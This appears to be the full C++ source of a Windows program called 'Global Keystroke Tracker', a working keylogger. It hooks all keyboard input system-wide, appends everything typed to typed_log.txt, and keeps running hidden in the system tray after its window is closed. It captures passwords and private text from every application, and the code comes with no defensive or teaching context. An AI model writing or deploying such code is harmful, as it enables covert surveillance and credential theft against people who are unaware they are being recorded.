#include <windows.h>
#include <shellapi.h>
#include <string>
#include <fstream>
#include <ctime>

#define WM_TRAYICON (WM_USER + 1)

HWND g_hwnd = NULL;
HHOOK g_hHook = NULL;
std::wstring g_typedText;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            DWORD vkCode = pKeyBoard->vkCode;
            wchar_t key = (wchar_t)vkCode;

            // Handle printable characters
            if (vkCode >= 65 && vkCode <= 90) // A-Z
            {
                // Check if shift is pressed
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                    g_typedText += (wchar_t)vkCode;
                else
                    g_typedText += (wchar_t)(vkCode + 32);
            }
            else if (vkCode >= 48 && vkCode <= 57) // 0-9
            {
                g_typedText += (wchar_t)vkCode;
            }
            else if (vkCode == VK_SPACE)
            {
                g_typedText += L' ';
            }
            else if (vkCode == VK_RETURN)
            {
                g_typedText += L'\n';
            }
            else if (vkCode == VK_BACK)
            {
                if (!g_typedText.empty())
                    g_typedText.pop_back();
            }
            else if (vkCode == VK_TAB)
            {
                g_typedText += L'\t';
            }
            else if (vkCode == 190 || vkCode == 110) // . or . on numpad
            {
                g_typedText += L'.';
            }
            else if (vkCode == 188) // comma
            {
                g_typedText += L',';
            }
            else if (vkCode == 186) // semicolon
            {
                g_typedText += L';';
            }
            else if (vkCode == 222) // apostrophe
            {
                g_typedText += L'\'';
            }

            // Save to file
            std::wofstream file(L"typed_log.txt", std::ios::app);
            if (file.is_open())
            {
                file << g_typedText << std::endl;
                file.close();
            }

            // Update window display
            if (g_hwnd)
                InvalidateRect(g_hwnd, NULL, TRUE);
        }
    }

    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
    {
        // Install global keyboard hook
        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
        if (!g_hHook)
        {
            MessageBox(hwnd, L"Failed to install keyboard hook!", L"Error", MB_OK | MB_ICONERROR);
            return -1;
        }
        break;
    }

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        RECT rect;
        GetClientRect(hwnd, &rect);
        FillRect(hdc, &rect, (HBRUSH)(COLOR_WINDOW + 1));

        SetTextColor(hdc, RGB(0, 0, 0));
        SetBkMode(hdc, TRANSPARENT);
        DrawTextW(hdc, g_typedText.c_str(), -1, &rect, DT_LEFT | DT_TOP | DT_WORDBREAK);

        EndPaint(hwnd, &ps);
        break;
    }

    case WM_CLOSE:
    {
        ShowWindow(hwnd, SW_HIDE);

        NOTIFYICONDATA nid = {};
        nid.cbSize = sizeof(NOTIFYICONDATA);
        nid.hWnd = hwnd;
        nid.uID = 1;
        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
        nid.uCallbackMessage = WM_TRAYICON;
        nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        wcscpy_s(nid.szTip, sizeof(nid.szTip) / sizeof(nid.szTip[0]), L"Global Key Tracker Running");

        Shell_NotifyIcon(NIM_ADD, &nid);
        return 0;
    }

    case WM_TRAYICON:
    {
        if (lParam == WM_LBUTTONDOWN)
        {
            ShowWindow(hwnd, SW_SHOW);
            SetForegroundWindow(hwnd);

            NOTIFYICONDATA nid = {};
            nid.cbSize = sizeof(NOTIFYICONDATA);
            nid.hWnd = hwnd;
            nid.uID = 1;
            Shell_NotifyIcon(NIM_DELETE, &nid);
        }
        break;
    }

    case WM_DESTROY:
    {
        if (g_hHook)
            UnhookWindowsHookEx(g_hHook);

        PostQuitMessage(0);
        return 0;
    }

    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    const wchar_t CLASS_NAME[] = L"GlobalKeyTrackerApp";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClass(&wc);

    g_hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        L"Global Keystroke Tracker",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        800, 600,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (g_hwnd == NULL)
        return 0;

    ShowWindow(g_hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}